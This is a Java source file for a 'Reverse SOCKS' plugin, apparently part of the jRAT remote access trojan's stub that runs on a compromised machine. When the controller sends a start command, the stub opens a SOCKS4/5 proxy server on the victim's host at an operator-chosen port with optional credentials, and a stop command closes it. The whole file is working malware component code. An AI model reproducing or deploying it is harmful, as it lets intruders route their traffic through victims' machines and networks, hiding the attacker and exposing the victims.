package jrat.plugin.socks.stub;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Hashtable;
import java.util.StringTokenizer;

import jrat.api.stub.StubPlugin;
import jrat.plugins.socks.Global;
import socks.InetRange;
import socks.ProxyServer;
import socks.server.IdentAuthenticator;
import socks.server.ServerAuthenticatorNone;
import socks.server.UserPasswordAuthenticator;
import socks.server.UserValidation;

@SuppressWarnings("unused")
public class SocksPlugin extends StubPlugin {
	
	private DataInputStream dis;
	private DataOutputStream dos;
	private ProxyServer server;

	@Override
	public void onDisconnect(Exception ex) throws Exception {
		
	}

	@Override
	public void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception {
		this.dis = dis;
		this.dos = dos;
	}

	@Override
	public void onPacket(short header) throws Exception {
		if (header == Global.HEADER_START) {	
			final boolean socks5 = dis.readBoolean();
			final String host = dis.readUTF();
			final int port = dis.readInt();
			final boolean auth = dis.readBoolean();
			final String user = dis.readUTF();
			final String pass = dis.readUTF();				
								
			new Thread(new Runnable() {
				public void run() {
					try {
						ProxyServer server = new ProxyServer(socks5 && auth ? new UserPasswordAuthenticator(new UserValidation() {
							@Override
							public boolean isUserValid(String username, String password, Socket connection) {
								if (!auth) {
									return true;
								}
								return username.equals(user) && password.equals(pass);
							}			
						}) : new ServerAuthenticatorNone());
						ProxyServer.setLog(System.out);
					    SocksPlugin.this.server = server;
					    System.out.println(host + ":" + port);
					    server.start(port, 5, host);
					} catch (Exception ex) {						
						ex.printStackTrace();
					}
				}
			}).start();
		} else if (header == Global.HEADER_STOP) {
			if (server != null) {
				server.stop();
				server = null;
			}
		}
	}
	@Override
	public void onEnable() throws Exception {
		
	}
	
	@Override
	public String getName() {
		return "Reverse SOCKS";
	}

}
